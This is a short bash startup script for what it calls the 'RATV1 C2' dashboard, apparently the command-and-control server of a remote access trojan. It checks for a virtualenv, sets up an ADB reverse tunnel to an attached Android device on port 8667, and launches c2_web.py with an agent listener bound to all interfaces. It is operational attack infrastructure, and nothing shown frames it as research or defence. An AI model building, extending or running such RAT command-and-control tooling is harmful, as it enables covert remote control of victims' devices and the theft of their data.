#!/bin/bash
echo ""
echo " RATV1 C2 -- starting dashboard"
echo ""

if [ ! -f "venv/bin/python" ]; then
    echo " [!] venv not found. Run ./setup.sh first."
    exit 1
fi

# ADB tunnel if device connected
if command -v adb &>/dev/null; then
    if adb devices | grep -q "device$"; then
        echo " [+] ADB device detected -- setting reverse tunnel..."
        adb reverse tcp:8667 tcp:8667 2>/dev/null && echo " [+] tunnel: device:8667 -> localhost:8667"
    fi
fi

echo " [.] Starting C2 dashboard on http://localhost:5006"
echo " [.] Agent listener on 0.0.0.0:8667"
echo ""
venv/bin/python c2_web.py "$@"
